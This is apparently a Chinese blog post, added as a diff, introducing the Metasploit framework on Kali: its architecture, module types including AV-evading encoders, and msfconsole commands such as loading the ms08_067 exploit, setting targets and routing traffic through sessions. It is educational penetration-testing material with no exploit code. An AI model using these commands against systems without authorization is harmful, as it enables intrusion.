@@ -1,0 +1,1637 @@
+<!DOCTYPE HTML>
+<html lang="zh-CN">
+
+
+<head>
+    <meta charset="utf-8">
+    <meta name="keywords" content="Kali渗透测试-MSF简介, 无心">
+    <meta name="description" content="Metasploit 简介
+
+基于最流行、最强大、最具扩展性的渗透测试平台软件
+基于Metasploit进行渗透测试和漏洞分析的流程和方法
+2003年由HD More发布第一版，2007年用 ruby 语言重写
+框架集成了渗透测试标准（PR">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <meta name="renderer" content="webkit|ie-stand|ie-comp">
+    <meta name="mobile-web-app-capable" content="yes">
+    <meta name="format-detection" content="telephone=no">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <meta name="referrer" content="no-referrer-when-downgrade">
+    <!-- Global site tag (gtag.js) - Google Analytics -->
+
+
+    <title>Kali渗透测试-MSF简介 | 无心</title>
+    <link rel="icon" type="image/png" href="/favicon.png">
+
+    <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.min.css">
+    <link rel="stylesheet" type="text/css" href="/libs/materialize/materialize.min.css">
+    <link rel="stylesheet" type="text/css" href="/libs/aos/aos.css">
+    <link rel="stylesheet" type="text/css" href="/libs/animate/animate.min.css">
+    <link rel="stylesheet" type="text/css" href="/libs/lightGallery/css/lightgallery.min.css">
+    <link rel="stylesheet" type="text/css" href="/css/matery.css">
+    <link rel="stylesheet" type="text/css" href="/css/my.css">
+
+    <script src="/libs/jquery/jquery-3.6.0.min.js"></script>
+
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+
+
+   <style>
+    body{
+       background-image: url(https://cdn.jsdelivr.net/gh/Tokisaki-Galaxy/res/site/medias/background.jpg);
+       background-repeat:no-repeat;
+       background-size: 100% 100%;
+       background-attachment:fixed;
+    }
+</style>
+
+
+
+<body>
+    <header class="navbar-fixed">
+    <nav id="headNav" class="bg-color nav-transparent">
+        <div id="navContainer" class="nav-wrapper container">
+            <div class="brand-logo">
+                <a href="/" class="waves-effect waves-light">
+                    
+                    <img src="/medias/logo.png" class="logo-img" alt="LOGO">
+                    
+                    <span class="logo-span">无心</span>
+                </a>
+            </div>
+            
+
+<a href="#" data-target="mobile-nav" class="sidenav-trigger button-collapse"><i class="fas fa-bars"></i></a>
+<ul class="right nav-menu">
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/" class="waves-effect waves-light">
+      
+      <i class="fas fa-home" style="zoom: 0.6;"></i>
+      
+      <span>首页</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/tags" class="waves-effect waves-light">
+      
+      <i class="fas fa-tags" style="zoom: 0.6;"></i>
+      
+      <span>标签</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/categories" class="waves-effect waves-light">
+      
+      <i class="fas fa-bookmark" style="zoom: 0.6;"></i>
+      
+      <span>分类</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/archives" class="waves-effect waves-light">
+      
+      <i class="fas fa-archive" style="zoom: 0.6;"></i>
+      
+      <span>归档</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/about" class="waves-effect waves-light">
+      
+      <i class="fas fa-user-circle" style="zoom: 0.6;"></i>
+      
+      <span>关于</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/contact" class="waves-effect waves-light">
+      
+      <i class="fas fa-comments" style="zoom: 0.6;"></i>
+      
+      <span>留言板</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/friends" class="waves-effect waves-light">
+      
+      <i class="fas fa-address-book" style="zoom: 0.6;"></i>
+      
+      <span>友情链接</span>
+    </a>
+    
+  </li>
+  
+  <li>
+    <a href="#searchModal" class="modal-trigger waves-effect waves-light">
+      <i id="searchIcon" class="fas fa-search" title="搜索" style="zoom: 0.85;"></i>
+    </a>
+  </li>
+</ul>
+
+
+<div id="mobile-nav" class="side-nav sidenav">
+
+    <div class="mobile-head bg-color">
+        
+        <img src="/medias/logo.png" class="logo-img circle responsive-img">
+        
+        <div class="logo-name">无心</div>
+        <div class="logo-desc">
+            
+            你要努力，你想要的，只能你自己给；别人给的，你要问问自己，拿的起吗。
+            
+        </div>
+    </div>
+
+    <ul class="menu-list mobile-menu-list">
+        
+        <li class="m-nav-item">
+	  
+		<a href="/" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-home"></i>
+			
+			首页
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/tags" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-tags"></i>
+			
+			标签
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/categories" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-bookmark"></i>
+			
+			分类
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/archives" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-archive"></i>
+			
+			归档
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/about" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-user-circle"></i>
+			
+			关于
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/contact" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-comments"></i>
+			
+			留言板
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/friends" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-address-book"></i>
+			
+			友情链接
+		</a>
+          
+        </li>
+        
+        
+        <li><div class="divider"></div></li>
+        <li>
+            <a href="https://github.com/blinkfox/hexo-theme-matery" class="waves-effect waves-light" target="_blank">
+                <i class="fab fa-github-square fa-fw"></i>Fork Me
+            </a>
+        </li>
+        
+    </ul>
+</div>
+
+
+        </div>
+
+        
+            <style>
+    .nav-transparent .github-corner {
+        display: none !important;
+    }
+
+    .github-corner {
+        position: absolute;
+        z-index: 10;
+        top: 0;
+        right: 0;
+        border: 0;
+        transform: scale(1.1);
+    }
+
+    .github-corner svg {
+        color: #0f9d58;
+        fill: #fff;
+        height: 64px;
+        width: 64px;
+    }
+
+    .github-corner:hover .octo-arm {
+        animation: a 0.56s ease-in-out;
+    }
+
+    .github-corner .octo-arm {
+        animation: none;
+    }
+
+    @keyframes a {
+        0%,
+        to {
+            transform: rotate(0);
+        }
+        20%,
+        60% {
+            transform: rotate(-25deg);
+        }
+        40%,
+        80% {
+            transform: rotate(10deg);
+        }
+    }
+</style>
+
+<a href="https://github.com/blinkfox/hexo-theme-matery" class="github-corner tooltipped hide-on-med-and-down" target="_blank"
+   data-tooltip="Fork Me" data-position="left" data-delay="50">
+    <svg viewBox="0 0 250 250" aria-hidden="true">
+        <path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path>
+        <path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2"
+              fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path>
+        <path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z"
+              fill="currentColor" class="octo-body"></path>
+    </svg>
+</a>
+        
+    </nav>
+
+</header>
+
+    
+
+
+
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/19.jpg')">
+    <div class="container" style="right: 0px;left: 0px;">
+        <div class="row">
+            <div class="col s12 m12 l12">
+                <div class="brand">
+                    <h1 class="description center-align post-title">Kali渗透测试-MSF简介</h1>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+
+<main class="post-container content">
+
+    
+    <link rel="stylesheet" href="/libs/tocbot/tocbot.css">
+<style>
+    #articleContent h1::before,
+    #articleContent h2::before,
+    #articleContent h3::before,
+    #articleContent h4::before,
+    #articleContent h5::before,
+    #articleContent h6::before {
+        display: block;
+        content: " ";
+        height: 100px;
+        margin-top: -100px;
+        visibility: hidden;
+    }
+
+    #articleContent :focus {
+        outline: none;
+    }
+
+    .toc-fixed {
+        position: fixed;
+        top: 64px;
+    }
+
+    .toc-widget {
+        width: 345px;
+        padding-left: 20px;
+    }
+
+    .toc-widget .toc-title {
+        padding: 35px 0 15px 17px;
+        font-size: 1.5rem;
+        font-weight: bold;
+        line-height: 1.5rem;
+    }
+
+    .toc-widget ol {
+        padding: 0;
+        list-style: none;
+    }
+
+    #toc-content {
+        padding-bottom: 30px;
+        overflow: auto;
+    }
+
+    #toc-content ol {
+        padding-left: 10px;
+    }
+
+    #toc-content ol li {
+        padding-left: 10px;
+    }
+
+    #toc-content .toc-link:hover {
+        color: #42b983;
+        font-weight: 700;
+        text-decoration: underline;
+    }
+
+    #toc-content .toc-link::before {
+        background-color: transparent;
+        max-height: 25px;
+
+        position: absolute;
+        right: 23.5vw;
+        display: block;
+    }
+
+    #toc-content .is-active-link {
+        color: #42b983;
+    }
+
+    #floating-toc-btn {
+        position: fixed;
+        right: 15px;
+        bottom: 76px;
+        padding-top: 15px;
+        margin-bottom: 0;
+        z-index: 998;
+    }
+
+    #floating-toc-btn .btn-floating {
+        width: 48px;
+        height: 48px;
+    }
+
+    #floating-toc-btn .btn-floating i {
+        line-height: 48px;
+        font-size: 1.4rem;
+    }
+</style>
+<div class="row">
+    <div id="main-content" class="col s12 m12 l9">
+        <!-- 文章内容详情 -->
+<div id="artDetail">
+    <div class="card">
+        <div class="card-content article-info">
+            <div class="row tag-cate">
+                <div class="col s7">
+                    
+                    <div class="article-tag">
+                        
+                            <a href="/tags/Kali/">
+                                <span class="chip bg-color">Kali</span>
+                            </a>
+                        
+                            <a href="/tags/MSF/">
+                                <span class="chip bg-color">MSF</span>
+                            </a>
+                        
+                    </div>
+                    
+                </div>
+                <div class="col s5 right-align">
+                    
+                    <div class="post-cate">
+                        <i class="fas fa-bookmark fa-fw icon-category"></i>
+                        
+                            <a href="/categories/Kali/" class="post-category">
+                                Kali
+                            </a>
+                        
+                    </div>
+                    
+                </div>
+            </div>
+
+            <div class="post-info">
+                
+                <div class="post-date info-break-policy">
+                    <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
+                    2023-02-19
+                </div>
+                
+
+                
+
+                
+                <div class="info-break-policy">
+                    <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
+                    2.9k
+                </div>
+                
+
+                
+
+                
+                    <div id="busuanzi_container_page_pv" class="info-break-policy">
+                        <i class="far fa-eye fa-fw"></i>阅读次数:&nbsp;&nbsp;
+                        <span id="busuanzi_value_page_pv"></span>
+                    </div>
+				
+            </div>
+        </div>
+        <hr class="clearfix">
+
+        
+        <!-- 是否加载使用自带的 prismjs. -->
+        <link rel="stylesheet" href="/libs/prism/prism.css">
+        
+
+        
+
+        <div class="card-content article-card-content">
+            <div id="articleContent">
+                <h2 id="Metasploit-简介"><a href="#Metasploit-简介" class="headerlink" title="Metasploit 简介"></a>Metasploit 简介</h2><blockquote>
+<ul>
+<li>基于最流行、最强大、最具扩展性的渗透测试平台软件</li>
+<li>基于Metasploit进行渗透测试和漏洞分析的流程和方法</li>
+<li>2003年由HD More发布第一版，2007年用 ruby 语言重写<ul>
+<li>框架集成了渗透测试标准（PRTS）思想</li>
+<li>一定程度上统一了渗透测试和漏洞研究的工作环境</li>
+<li>新的攻击代码可以比较容易的加入框架</li>
+</ul>
+</li>
+<li>开发活跃版本更新频繁（每周）<ul>
+<li>早期版本基于社区力量维护，被 Rapid 7收购后打造出其商业版产品</li>
+<li>目前分化为四个版本，社区版本奕然十分活跃</li>
+<li>HD More说：为Metasploit写书是种自虐</li>
+<li>2014年之后市场上没有再出现新的Metasploit教材</li>
+</ul>
+</li>
+</ul>
+</blockquote>
+<h3 id="Pro-版是企业级全功能的高级渗透测试平台"><a href="#Pro-版是企业级全功能的高级渗透测试平台" class="headerlink" title="Pro 版是企业级全功能的高级渗透测试平台"></a>Pro 版是企业级全功能的高级渗透测试平台</h3><p><img src="/2023/02/19/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-MSF%E7%AE%80%E4%BB%8B/image-20230219100003684.png" alt="image-20230219100003684"></p>
+<h2 id="MSF架构"><a href="#MSF架构" class="headerlink" title="MSF架构"></a>MSF架构</h2><p><img src="/2023/02/19/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-MSF%E7%AE%80%E4%BB%8B/image-20230219100141130.png" alt="image-20230219100141130"></p>
+<ul>
+<li><p>Rex</p>
+<ul>
+<li>基础功能库，用于完成日常基础任务，无需人工手动编码实现</li>
+<li>处理 soclet 连接访问、协议应答（ҁhttp&#x2F;SSL&#x2F;SMB等）</li>
+<li>编码转换（XOR̵ Base64̵ Unicode）</li>
+</ul>
+</li>
+<li><p>Msf::Core</p>
+<ul>
+<li>提供 Msf 的核心基本API，是框架的核心能力实现库</li>
+</ul>
+</li>
+<li><p>Plugin 插件</p>
+<ul>
+<li>连接和调用外部扩展功能和系统</li>
+</ul>
+</li>
+<li><p>技术功能模块（不是流程模块）</p>
+<ul>
+<li>路径：&#x2F;usr&#x2F;share&#x2F;metasploit-framework&#x2F;modules&#x2F;</li>
+</ul>
+<p><img src="/2023/02/19/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-MSF%E7%AE%80%E4%BB%8B/image-20230219124158298.png" alt="image-20230219124158298"></p>
+<ul>
+<li><strong>Exploits</strong>：利用系统漏洞进行攻击的动作，此模块对应每一个具体漏洞的攻击方法（主动、被动）</li>
+</ul>
+<p><img src="/2023/02/19/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-MSF%E7%AE%80%E4%BB%8B/image-20230219122836869.png" alt="image-20230219122836869"></p>
+<ul>
+<li><strong>Payloads</strong>：成功exploit之后，真正的目标系统执行的代码或指令<ul>
+<li>Shellcode 或 系统命令</li>
+<li>三种主要的Payload：&#x2F;usr&#x2F;share&#x2F;metasploit-framework&#x2F;modules&#x2F;payloads&#x2F;</li>
+<li><strong>Single</strong>：all-in-one（独立载荷）</li>
+<li><strong>Stager</strong>：目标计算机内存有限时，线传输一个较小的payload用于建立连接（传输器载荷）</li>
+<li><strong>Stages</strong>：利用stager建立的连接下载的后续payload（传输体）</li>
+<li>Stager、Stages都有多种类型，适用于不同场景</li>
+<li>Shellcode 是payload的一种，由于其建立正向 &#x2F; 反向 shell 而得名</li>
+</ul>
+</li>
+</ul>
+<p><img src="/2023/02/19/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-MSF%E7%AE%80%E4%BB%8B/image-20230219125218609.png" alt="image-20230219125218609"></p>
+<ul>
+<li><strong>Auxiliary</strong>：执行信息搜集、枚举、指纹探测、扫描等功能的辅助模块（没有paylaod的exploit模块）</li>
+</ul>
+<p><img src="/2023/02/19/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-MSF%E7%AE%80%E4%BB%8B/image-20230219125240333.png" alt="image-20230219125240333"></p>
+<ul>
+<li><strong>Encoders</strong>：对payload进行加密，躲避AV检查的模块</li>
+</ul>
+<p><img src="/2023/02/19/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-MSF%E7%AE%80%E4%BB%8B/image-20230219125307510.png" alt="image-20230219125307510"></p>
+<ul>
+<li><strong>Nops</strong>：提高paylaod稳定性及维持大小。在渗透攻击构造恶意数据缓冲区时，常常要在真正要执行的Shellcode之前添加一段空指令，这样当触发渗透攻击后跳转执行Shellcode时，有一个较大的安全着陆区，从而避免受到内存，地址随机化，返回地址计算偏差等原因造成的Shellcode执行失败，提高渗透攻击的可靠性。</li>
+</ul>
+<p><img src="/2023/02/19/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-MSF%E7%AE%80%E4%BB%8B/image-20230219125325427.png" alt="image-20230219125325427"></p>
+<ul>
+<li><strong>Post</strong>：后期渗透模块。取得目标系统远程控制权后，进行一系列的后渗透攻击动作，如获取敏感信息、跳板攻击等操作。</li>
+</ul>
+<p><img src="/2023/02/19/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-MSF%E7%AE%80%E4%BB%8B/image-20230219125348109.png" alt="image-20230219125348109"></p>
+</li>
+</ul>
+<h2 id="MSF基本使用方法"><a href="#MSF基本使用方法" class="headerlink" title="MSF基本使用方法"></a>MSF基本使用方法</h2><ul>
+<li><p>升级 &#x2F; 升级</p>
+<ol>
+<li><code>apt update</code></li>
+<li><code>apt install metasploit-framework</code></li>
+</ol>
+</li>
+<li><p><strong>msfconsole</strong> 使用接口</p>
+<ul>
+<li>最流行的用户接口</li>
+<li>几乎可以使用全部msf功能</li>
+<li>控制台命令支持 TAB 自动补齐</li>
+<li>支持外部命令的执行（系统命令等）</li>
+</ul>
+</li>
+<li><p><strong>msf 控制台命令</strong></p>
+<ul>
+<li>点击鼠标启动  &#x2F; msfconsole -h -q -r -v &#x2F;exit</li>
+<li>help &#x2F; ? &#x2F; help vulns</li>
+<li>banner</li>
+</ul>
+<p><img src="/2023/02/19/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-MSF%E7%AE%80%E4%BB%8B/image-20230219174402181.png" alt="image-20230219174402181"></p>
+<ul>
+<li>color</li>
+</ul>
+<blockquote>
+<p>在使用过程中默认使用auto模式，颜色识别</p>
+</blockquote>
+<p><img src="/2023/02/19/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-MSF%E7%AE%80%E4%BB%8B/image-20230219174215475.png" alt="image-20230219174215475"></p>
+<ul>
+<li>connect</li>
+</ul>
+<blockquote>
+<p>类似于nc，连接其他主机</p>
+</blockquote>
+<p><img src="/2023/02/19/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-MSF%E7%AE%80%E4%BB%8B/image-20230219174343679.png" alt="image-20230219174343679"></p>
+<ul>
+<li><strong>show</strong></li>
+</ul>
+<blockquote>
+<p>可查看各种模块内容及各个模块下的目录或文件内容</p>
+<p>show auxiliary &#x2F; exploits &#x2F; payloads &#x2F; encoders &#x2F; nops &#x2F; post</p>
+</blockquote>
+<p><img src="/2023/02/19/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-MSF%E7%AE%80%E4%BB%8B/image-20230219174752734.png" alt="image-20230219174752734"></p>
+<ul>
+<li>search</li>
+</ul>
+<blockquote>
+<p>搜索需要查找的payload&#x2F;exploit等信息</p>
+<p>search name:mysql &#x2F; path:scada &#x2F; platform:aix &#x2F; type:aux &#x2F;author:aaron &#x2F; cve:2011    # 利用关键字多条件同时搜索</p>
+</blockquote>
+<p><img src="/2023/02/19/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-MSF%E7%AE%80%E4%BB%8B/image-20230219190507577.png" alt="image-20230219190507577"></p>
+<p><img src="/2023/02/19/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-MSF%E7%AE%80%E4%BB%8B/image-20230219190529577.png" alt="image-20230219190529577"></p>
+<ul>
+<li>use exploit&#x2F;windows&#x2F;smb&#x2F;ms08_067_netapi<ul>
+<li>show options &#x2F; payloads &#x2F; targets &#x2F; advanced &#x2F; evasion</li>
+</ul>
+</li>
+</ul>
+<blockquote>
+<p>查找到相关exploit后利用use命令使用当前模块</p>
+</blockquote>
+<p><img src="/2023/02/19/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-MSF%E7%AE%80%E4%BB%8B/image-20230219191620623.png" alt="image-20230219191620623"></p>
+<ul>
+<li><strong>info</strong>：在当前模块下使用的子命令，查看当前模块具体信息</li>
+</ul>
+<p><img src="/2023/02/19/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-MSF%E7%AE%80%E4%BB%8B/image-20230219191725759.png" alt="image-20230219191725759"></p>
+<p><img src="/2023/02/19/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-MSF%E7%AE%80%E4%BB%8B/image-20230219191913907.png" alt="image-20230219191913907"></p>
+<p><img src="/2023/02/19/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-MSF%E7%AE%80%E4%BB%8B/image-20230219192123994.png" alt="image-20230219192123994"></p>
+<blockquote>
+<p>show options查看当前模块需要配置的信息</p>
+</blockquote>
+<p><img src="/2023/02/19/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-MSF%E7%AE%80%E4%BB%8B/image-20230219192254280.png" alt="image-20230219192254280"></p>
+<blockquote>
+<p>show advanced，可具情况进行修改current setting&#x2F;required的值</p>
+</blockquote>
+<p><img src="/2023/02/19/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-MSF%E7%AE%80%E4%BB%8B/image-20230219192729713.png" alt="image-20230219192729713"></p>
+<ul>
+<li><strong>edit</strong>：编辑脚本或者模块内容</li>
+</ul>
+<p><img src="/2023/02/19/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-MSF%E7%AE%80%E4%BB%8B/image-20230219193122652.png" alt="image-20230219193122652"></p>
+<p><img src="/2023/02/19/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-MSF%E7%AE%80%E4%BB%8B/image-20230219193147477.png" alt="image-20230219193147477"></p>
+<ul>
+<li><p>check：检查当前漏洞是否存在，向目标端口发钱连接做验证，大部分模块不支持check</p>
+</li>
+<li><p><strong>back</strong>：在子命令提示符下返回上一级</p>
+</li>
+<li><p><strong>db_</strong>*</p>
+</li>
+</ul>
+<blockquote>
+<p>数据库默认存放位置：&#x2F;usr&#x2F;share&#x2F;metasploit-framework&#x2F;config&#x2F;database.yml</p>
+<p>db_disconnect：断开当前数据库的连接</p>
+</blockquote>
+<p><img src="/2023/02/19/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-MSF%E7%AE%80%E4%BB%8B/image-20230219195621466.png" alt="image-20230219195621466"></p>
+<blockquote>
+<p>db_status：查看数据库状态</p>
+<p>若数据未开启，开启数据库后再启动msf</p>
+</blockquote>
+<p><img src="/2023/02/19/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-MSF%E7%AE%80%E4%BB%8B/image-20230219202523907.png" alt="image-20230219202523907"></p>
+<p><img src="/2023/02/19/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-MSF%E7%AE%80%E4%BB%8B/image-20230219195801757.png" alt="image-20230219195801757"></p>
+<blockquote>
+<p>db_connect：连接其他数据库，可连接自定义数据库</p>
+</blockquote>
+<p><img src="/2023/02/19/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-MSF%E7%AE%80%E4%BB%8B/image-20230219201000714.png" alt="image-20230219201000714"></p>
+<blockquote>
+<p>db_nmap：调用nmap，扫描结果自动保存到msf数据库中</p>
+</blockquote>
+<p><img src="/2023/02/19/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-MSF%E7%AE%80%E4%BB%8B/image-20230219202138997.png" alt="image-20230219202138997"></p>
+<blockquote>
+<p>db_import &#x2F;root&#x2F;nmap.xml：导入文件</p>
+</blockquote>
+<p><img src="/2023/02/19/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-MSF%E7%AE%80%E4%BB%8B/image-20230219210015426.png" alt="image-20230219210015426"></p>
+<blockquote>
+<p>db_export -f xml &#x2F;root&#x2F;bak.xml：导出扫描结果，支持xml和pwdump格式</p>
+</blockquote>
+<p><img src="/2023/02/19/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-MSF%E7%AE%80%E4%BB%8B/image-20230219210105901.png" alt="image-20230219210105901"></p>
+<ul>
+<li>hosts：查看存储到数据库中的扫描结果</li>
+</ul>
+<blockquote>
+<p>hosts &lt;目标IP&gt;：筛选目标主机 </p>
+<p>hosts -u：筛选存活主机</p>
+<p>hosts -c address,os_flavor -S Linux：只显示address和os_flavor两列；-S参数 进行检索</p>
+</blockquote>
+<p><img src="/2023/02/19/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-MSF%E7%AE%80%E4%BB%8B/image-20230219202152122.png" alt="image-20230219202152122"></p>
+<ul>
+<li>service</li>
+</ul>
+<blockquote>
+<p>-a：添加筛选记录</p>
+<p>-p：筛选开放端口的主机</p>
+<p>-c：指定显示某些列</p>
+<p>-s：指定服务名称</p>
+<p>-u：筛选存活主机</p>
+<p>-S：指定字符串过滤筛选结果</p>
+</blockquote>
+<p><img src="/2023/02/19/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-MSF%E7%AE%80%E4%BB%8B/image-20230219202959467.png" alt="image-20230219202959467"></p>
+<p><img src="/2023/02/19/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-MSF%E7%AE%80%E4%BB%8B/image-20230219204224912.png" alt="image-20230219204224912"></p>
+<ul>
+<li><strong>vulns</strong>                                                               # 查看扫描出的漏洞信息</li>
+<li><strong>creds</strong>                                                               # 查看扫描出的密码信息</li>
+<li><strong>loot</strong>                                                                 # 查看获取到hash值</li>
+<li>set &#x2F; unset                                                      # 模块下的子命令，设置&#x2F;取消 目标IP等信息</li>
+<li>setg &#x2F;unsetg                                                   # 全局设置 &#x2F; 取消全局设置</li>
+</ul>
+<blockquote>
+<p>凡是模块需要用到PHOSTS变量时候，自动就会设置为192.168.216.167</p>
+<p>使用setg命令后，若不是用save保存，只会在当前工作状态下有效，重新进入无效</p>
+</blockquote>
+<p><img src="/2023/02/19/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-MSF%E7%AE%80%E4%BB%8B/image-20230219210847964.png" alt="image-20230219210847964"></p>
+<ul>
+<li>save                                                                 # 保存全局变量</li>
+</ul>
+<blockquote>
+<p>&#x2F;root&#x2F;.msf6&#x2F;config存放保存配置的配置文件</p>
+</blockquote>
+<ul>
+<li>run &#x2F; exploit                                                    # 两个命令相同，执行当前模块</li>
+<li>jobs                                                                  # exploit执行之后在后台执行</li>
+</ul>
+<blockquote>
+<p>通常用于exploit命令的参数使用：exploit -j</p>
+</blockquote>
+<ul>
+<li>session                                                            # 显示获得shell的会话列表</li>
+</ul>
+<blockquote>
+<p>-i：表示进入获得的shell（Shell、Meterpreter session、VNC三种shell）</p>
+<p>-l：列出获得shell列表</p>
+</blockquote>
+<ul>
+<li>load &#x2F; unlod &#x2F; loadpath                               # 加载 &#x2F; 卸载 外部插件</li>
+</ul>
+<blockquote>
+<p>-l：列出可调用的插件</p>
+<p>loadpath：加载指定目录存放的模块，比如自己开发的模块</p>
+</blockquote>
+<p><img src="/2023/02/19/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-MSF%E7%AE%80%E4%BB%8B/image-20230219213204793.png" alt="image-20230219213204793"></p>
+<ul>
+<li>route                                                              # 指定 session 路由流量</li>
+</ul>
+<blockquote>
+<p>route add 10.1.1.0 255.255.255.0 <sid>  凡是法网10.1.1.0的流量都通过sid的session发到内网中</sid></p>
+</blockquote>
+<p><img src="/2023/02/19/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-MSF%E7%AE%80%E4%BB%8B/image-20230219213656027.png" alt="image-20230219213656027"></p>
+<ul>
+<li>irb                                                                 # msf开发接口</li>
+</ul>
+<p><img src="/2023/02/19/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-MSF%E7%AE%80%E4%BB%8B/image-20230219214318355.png" alt="image-20230219214318355"></p>
+<p><img src="/2023/02/19/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-MSF%E7%AE%80%E4%BB%8B/image-20230219214403129.png" alt="image-20230219214403129"></p>
+<ul>
+<li>resource                                                     # 资源</li>
+</ul>
+<blockquote>
+<p>指定资源文件，资源文件存放配置信息</p>
+<p><code>.rc</code>为资源文件扩展名</p>
+<p>可使用：<code>msfconsole -r r.rc</code>启动msf时候就会调用r.rc这个资源文件</p>
+</blockquote>
+</li>
+</ul>
+<h2 id="Exploit-模块"><a href="#Exploit-模块" class="headerlink" title="Exploit 模块"></a>Exploit 模块</h2><h3 id="Active-exploit-主动"><a href="#Active-exploit-主动" class="headerlink" title="Active exploit(主动)"></a>Active exploit(主动)</h3><blockquote>
+<p>攻击者主动的向受害者发送payload，触发漏洞，受害者反弹shell或者侦听端口</p>
+<p>适合攻击服务器端程序</p>
+</blockquote>
